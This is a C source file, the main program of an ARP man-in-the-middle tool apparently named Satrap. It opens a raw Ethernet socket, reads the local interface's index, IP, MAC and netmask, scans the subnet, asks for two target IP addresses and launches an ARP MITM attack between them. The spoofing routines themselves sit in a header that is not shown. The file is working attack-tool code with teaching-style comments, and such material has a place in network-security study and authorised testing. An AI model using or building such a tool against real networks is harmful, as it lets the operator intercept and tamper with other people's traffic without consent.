/* Satrap/satrap.c */

#include "arp.h"

int main(int argc, char **argv)
{

  /* Argument parsing:
     network interface to use */
  if (argc < 2) {
    printf("[FAIL] Too few arguments\n"
	   "Usage: %s <interface>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  char *if_name = argv[1];



  /* ====================================================================== */

  /* RAW SOCKET CREATION */
  
  /* We open the raw socket */
  /* AF_PACKET: This is a raw Ethernet packet (Linux only, requires root)
     SOCK_DGRAM: The link-layer header is constructed automatically
     (to build it ourselves, we could have used SOCK_RAW)
     ETH_P_ALL: We want to listen to every EtherType (here, we could 
     also have chosen ETH_P_ARP) */
  int sockfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL));
  if (sockfd < 0) {
    perror("[FAIL] socket()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Raw Ethernet socket started successfully\n");
#endif



  /* ====================================================================== */

  /* INFORMATION ON THE LOCAL COMPUTER:
     - index number of the network interface
     - local IP address
     - local MAC address
     - subnet mask
  */

  /* Since this is very low-level, we can't use the usual interface
     name (e.g. "eth0"), so we need to get the index number of the
     ethernet interface. */
  //char *if_name = "wlp3s0"; /* Change this if needed */
  struct ifreq ifrindex;
  size_t if_name_len = strlen(if_name);
  if (if_name_len < sizeof(ifrindex.ifr_name)) {
    memcpy(ifrindex.ifr_name, if_name, if_name_len);
    ifrindex.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  /* We use ioctl() with SIOCGIFINDEX */
  if (ioctl(sockfd, SIOCGIFINDEX, &ifrindex) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  int ifindex = ifrindex.ifr_ifindex;
#ifdef DEBUG
  printf("[OK] Index number of the Ethernet interface %s: %d\n", if_name, ifindex);
#endif

  /* We get our IP address using ioctl() and SIOCGIFADDR */
  struct ifreq ifraddr;
  if (if_name_len < sizeof(ifraddr.ifr_name)) {
    memcpy(ifraddr.ifr_name, if_name, if_name_len);
    ifraddr.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFADDR, &ifraddr) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  struct sockaddr_in *ipaddr = (struct sockaddr_in *) &ifraddr.ifr_addr;
  char local_ip_string[16];
  if (!inet_ntop(AF_INET, &ipaddr->sin_addr, local_ip_string, sizeof(local_ip_string))) {
    perror("[FAIL] inet_ntop()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Local IP address: %s\n", local_ip_string);
#endif
  
  /* We get the MAC address using ioctl() (again) with SIOCGIFHWADDR */
  struct ifreq ifrhwaddr;
  if (if_name_len < sizeof(ifrhwaddr.ifr_name)) {
    memcpy(ifrhwaddr.ifr_name, if_name, if_name_len);
    ifrhwaddr.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFHWADDR, &ifrhwaddr) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  unsigned char *macaddr = (unsigned char *) &ifrhwaddr.ifr_hwaddr.sa_data;
#ifdef DEBUG
  printf("[OK] Local MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
	 macaddr[0], macaddr[1], macaddr[2], macaddr[3], macaddr[4], macaddr[5]);
#endif

  /* We get the subnet mask using ioctl() with SIOCGIFNETMASK */
  struct ifreq ifrnetmask;
  if (if_name_len < sizeof(ifrnetmask.ifr_name)) {
    memcpy(ifrnetmask.ifr_name, if_name, if_name_len);
    ifrnetmask.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFNETMASK, &ifrnetmask) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  struct sockaddr_in *netmask = (struct sockaddr_in *) &ifrnetmask.ifr_netmask;
  char netmask_string[16];
  if (!inet_ntop(AF_INET, &netmask->sin_addr, netmask_string, sizeof(netmask_string))) {
    perror("[FAIL] inet_ntop()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Local netmask: %s\n", netmask_string);
#endif



  /* ====================================================================== */

  /* ARP scan of the subnet */
  arp_scan(sockfd, ifindex, ipaddr, macaddr, netmask);



  /* ====================================================================== */

  /* Selection of the targets */

  char target1_ip_string[16];
  printf("Target 1 IP: ");
  scanf("%15s", target1_ip_string);
  printf("%s\n", target1_ip_string);
  struct in_addr target1_ip;
  if (!inet_pton(AF_INET, target1_ip_string, &target1_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }

  char target2_ip_string[16];
  printf("Target 2 IP: ");
  scanf("%15s", target2_ip_string);
  printf("%s\n", target2_ip_string);
  struct in_addr target2_ip;
  if (!inet_pton(AF_INET, target2_ip_string, &target2_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }


  /* ====================================================================== */

  /* ARP man-in-the-middle attack */
  printf("ARP man-in-the-middle attack on interface %s between %s and %s\n",
	 if_name, target1_ip_string, target2_ip_string);

  arp_mitm(sockfd, ifindex, ipaddr, macaddr, &target1_ip, &target2_ip);
  
  return EXIT_SUCCESS;
}


